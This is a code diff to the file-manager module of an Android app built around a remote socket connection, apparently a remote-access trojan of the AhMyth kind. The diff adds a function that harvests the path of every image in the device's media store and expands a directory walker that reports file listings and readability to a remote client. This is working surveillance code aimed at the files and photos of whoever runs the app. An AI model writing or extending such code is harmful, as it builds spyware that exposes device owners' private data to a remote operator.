@@ -1,5 +1,8 @@
 package com.remote.app;
 
+import android.database.Cursor;
+import android.net.Uri;
+import android.provider.MediaStore;
 import android.util.Log;
 
 import com.remote.app.socket.IOSocket;
@@ -13,41 +16,71 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.util.ArrayList;
 
 
 public class FileManager {
 
 
+    public static JSONArray getAllShownImagesPath() {
+        try {
+            Uri uri;
+            Cursor cursor;
+            int column_index_data, column_index_folder_name;
+            JSONArray listOfAllImages = new JSONArray();
+            String absolutePathOfImage = null;
+            uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+            String[] projection = {MediaStore.MediaColumns.DATA,
+                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
+
+            cursor = MainService.getContextOfApplication().getContentResolver().query(uri, projection, null,
+                    null, null);
+
+            column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
+            column_index_folder_name = cursor
+                    .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
+            while (cursor.moveToNext()) {
+                absolutePathOfImage = cursor.getString(column_index_data);
+
+                listOfAllImages.put(absolutePathOfImage);
+            }
+            return listOfAllImages;
+        } catch (Exception ex){
+            return new JSONArray();
+        }
+    }
     public static JSONArray walk(String path) {
-
-
         // Read all files sorted into the values-array
         JSONArray values = new JSONArray();
         File dir = new File(path);
+        JSONObject fileObj = new JSONObject();
+        boolean canRead = dir.canRead();
+
+        try {
+            fileObj.put("name", "../");
+            fileObj.put("canRead", canRead);
+            fileObj.put("parent", "./");
+            fileObj.put("isDir", true);
+            fileObj.put("path", dir.getParent());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        values.put(fileObj);
+
         if (!dir.canRead()) {
-            Log.d("cannot", "inaccessible");
-            try {
-                JSONObject errorJson = new JSONObject();
-                errorJson.put("type", "error");
-                errorJson.put("error", "Denied");
-                IOSocket.getInstance().getIoSocket().send("_0xFI", errorJson);
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
+            return values;
         }
 
-        File[] list = dir.listFiles();
         try {
-            if (list != null) {
-                JSONObject parenttObj = new JSONObject();
-                parenttObj.put("name", "../");
-                parenttObj.put("isDir", true);
-                parenttObj.put("path", dir.getParent());
-                values.put(parenttObj);
+            File[] list = dir.listFiles();
+            if (list != null && list.length >= 1) {
                 for (File file : list) {
                     if (!file.getName().startsWith(".")) {
-                        JSONObject fileObj = new JSONObject();
+                        fileObj = new JSONObject();
                         fileObj.put("name", file.getName());
+                        fileObj.put("canRead", true);
+                        fileObj.put("parent", dir.getParent());
                         fileObj.put("isDir", file.isDirectory());
                         fileObj.put("path", file.getAbsolutePath());
                         values.put(fileObj);
@@ -91,6 +124,7 @@ public class FileManager {
             } catch (JSONException e) {
                 e.printStackTrace();
             }
+
 
         }
     }
